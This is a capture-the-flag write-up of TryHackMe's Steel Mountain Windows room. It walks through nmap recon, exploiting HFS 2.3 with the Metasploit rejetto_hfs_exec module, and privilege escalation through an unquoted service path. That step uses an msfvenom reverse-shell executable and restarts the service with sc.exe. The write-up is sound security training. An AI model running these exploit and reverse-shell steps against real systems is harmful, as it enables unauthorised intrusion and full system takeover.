---
title: "Steel Mountain"
date: 2025-08-01
draft: false
summary: "Writeup for Steel Mountain CTF challenge on TryHackMe."
tags: ["windows", "unquoted service path"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/steelmountain/cover.webp"
  caption: "Steel Mountain TryHackMe Challenge"
  alt: "Steel Mountain cover"
platform: "TryHackMe"
---

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/steelmountain

## Reconnaissance

I performed an **nmap** aggressive scan on the target to get a comprehensive list of details including open ports, running services, configurations etc.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN steelmountain.nmap -Pn
```

| **Port** | **Service** |
| -------- | ----------- |
| 80       | http        |
| 135      | msrpc       |
| 139      | netbios     |
| 445      | smb         |
| 3389     | rdp         |
| 5985     | winrm       |
| 8080     | http        |
| 47001    | winrm       |
| 49152    | rpc         |
| 49153    | rpc         |
| 49154    | rpc         |
| 49155    | rpc         |
| 49156    | rpc         |
| 49163    | rpc         |
| 49164    | rpc         |

![](https://cdn.ziomsec.com/steelmountain/1.webp)

![](https://cdn.ziomsec.com/steelmountain/2.webp)

## Initial Foothold

I visited the web applications that were hosted on the target and found an **HTTP File Server** running on port 8080.

![](https://cdn.ziomsec.com/steelmountain/3.webp)

![](https://cdn.ziomsec.com/steelmountain/4.webp)

I then searched for exploits related to this specific version of the File server and found some.

```shell
searchsploit 'hfs 2.3'
```

![](https://cdn.ziomsec.com/steelmountain/5.webp)

Since there was a **Metasploit** version of the exploit, I started the **Metasploit** framework and selected the exploit.

```shell
use exploit/windows/http/rejetto_hfs_exec
```

I then configured the appropriate parameters.

```shell
set RHOSTS TARGET
set RPORT TARGET_PORT
set LHOST LISTENER
```

Finally, I ran the exploit and got a reverse shell.

```shell
run
> sysinfo
```

![](https://cdn.ziomsec.com/steelmountain/6.webp)

I initially gained a 32-bit shell, so I migrated to a 64 bit process to get a 64 bit shell.

```shell
pgrep explorer.exe
migrate PID
sysinfo
```

![](https://cdn.ziomsec.com/steelmountain/7.webp)

I then captured the user flag from *bill*'s Desktop.

```shell
more C:\Users\bill\Desktop\user.txt
```

![](https://cdn.ziomsec.com/steelmountain/8.webp)

## Privilege Escalation

After capturing the user flag, I downloaded **PowerUp.ps1** on my local system and transferred it to the target for local enumeration.
- https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

```shell
Import-Module PowerUp.ps1
Invoke-AllChecks
```

Executing **`Invoke-AllChecks`** revealed an **Unquoted Service Path** misconfiguration on a service running as Local System.

![](https://cdn.ziomsec.com/steelmountain/9.webp)

To exploit the misconfiguration, I first created an **exe** file with the same name as the service directory with a space in its name.

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LISTENER LPORT=5555 -f exe -o Advanced.exe
```

![](https://cdn.ziomsec.com/steelmountain/10.webp)

I then uploaded this application to the parent directory of the directory with the space in its name.

![](https://cdn.ziomsec.com/steelmountain/11.webp)

Finally, I restarted the service using **sc**.

```shell
sc.exe stop AdvancedSystemCareService9
```

![](https://cdn.ziomsec.com/steelmountain/12.webp)

I started a reverse shell listener on another instance of **metasploit** and got a reverse shell.

![](https://cdn.ziomsec.com/steelmountain/13.webp)

```shell
sc.exe start AdvancedSystemCareService9
```

![](https://cdn.ziomsec.com/steelmountain/14.webp)

![](https://cdn.ziomsec.com/steelmountain/15.webp)

Since I had **nt authority** privileges, I captured the root flag from *Administrator*'s Desktop.

```shell
more C:\Users\Administrator\Desktop\root.txt
```

![](https://cdn.ziomsec.com/steelmountain/16.webp)

---
